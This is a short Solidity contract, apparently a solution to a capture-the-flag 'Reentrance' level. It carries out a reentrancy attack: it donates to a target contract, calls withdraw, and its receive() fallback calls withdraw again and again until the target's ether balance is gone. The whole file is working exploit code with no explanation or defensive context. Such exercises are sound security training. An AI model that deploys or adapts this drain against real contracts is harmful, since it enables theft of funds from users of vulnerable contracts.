//SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

interface IReentrance {
    function donate(address _to) external payable;
    function balanceOf(address _who) external view returns (uint256 balance);
    function withdraw(uint256 _amount) external;
}

contract AttackReentrance {
    IReentrance public immutable ireentrance;
    uint256 public attackSize; // Dynamic tracking variable

    constructor(address _ireentrance) {
        ireentrance = IReentrance(_ireentrance);
    }

    function donateToWithdraw() external payable {
        attackSize = msg.value; 
        ireentrance.donate{value: msg.value}(address(this));        
        ireentrance.withdraw(attackSize);
    }

    receive() external payable {
        uint256 targetBalance = address(ireentrance).balance;
        
        if (targetBalance > 0) {
            uint256 nextWithdrawal = targetBalance < attackSize ? targetBalance : attackSize;
            ireentrance.withdraw(nextWithdrawal);
        }
    }
}